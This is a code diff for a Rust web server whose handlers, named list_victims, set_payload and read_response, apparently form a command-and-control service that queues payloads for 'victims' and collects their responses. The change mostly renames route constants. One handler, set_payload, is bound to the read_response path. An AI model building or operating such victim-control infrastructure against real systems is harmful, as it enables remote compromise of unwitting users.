@@ -20,24 +20,6 @@ use serde::{Deserialize, Serialize};
 use crate::errors::*;
 use crate::AppData;
 
-pub mod routes {
-    pub struct Attack {
-        pub list_victims: &'static str,
-        pub set_payload: &'static str,
-        pub read_response: &'static str,
-    }
-
-    impl Attack {
-        pub const fn new() -> Attack {
-            Attack {
-                list_victims: "/api/v1/attack/join",
-                set_payload: "/api/v1/attack/payload/set",
-                read_response: "/api/v1/attack/payload/response",
-            }
-        }
-    }
-}
-
 pub fn services(cfg: &mut actix_web::web::ServiceConfig) {
     cfg.service(list_victims);
     cfg.service(set_payload);
@@ -54,7 +36,7 @@ pub struct Password {
     pub password: String,
 }
 
-#[my_codegen::post(path = "crate::V1_API_ROUTES.attack.list_victims")]
+#[my_codegen::post(path = "crate::V1_ROUTES.attack.list_victims")]
 async fn list_victims(
     data: AppData,
     payload: web::Json<Password>,
@@ -83,7 +65,7 @@ pub struct PayloadID {
     pub id: i32,
 }
 
-#[my_codegen::post(path = "crate::V1_API_ROUTES.attack.read_response")]
+#[my_codegen::post(path = "crate::V1_ROUTES.attack.read_response")]
 async fn set_payload(data: AppData, payload: web::Json<Payload>) -> ServiceResult<impl Responder> {
     if payload.password == crate::SETTINGS.password {
         sqlx::query!(
@@ -130,7 +112,7 @@ pub struct PayloadResponse {
     pub response: Option<String>,
 }
 
-#[my_codegen::post(path = "crate::V1_API_ROUTES.attack.read_response")]
+#[my_codegen::post(path = "crate::V1_ROUTES.attack.read_response")]
 async fn read_response(
     data: AppData,
     payload: web::Json<ResponseReq>,
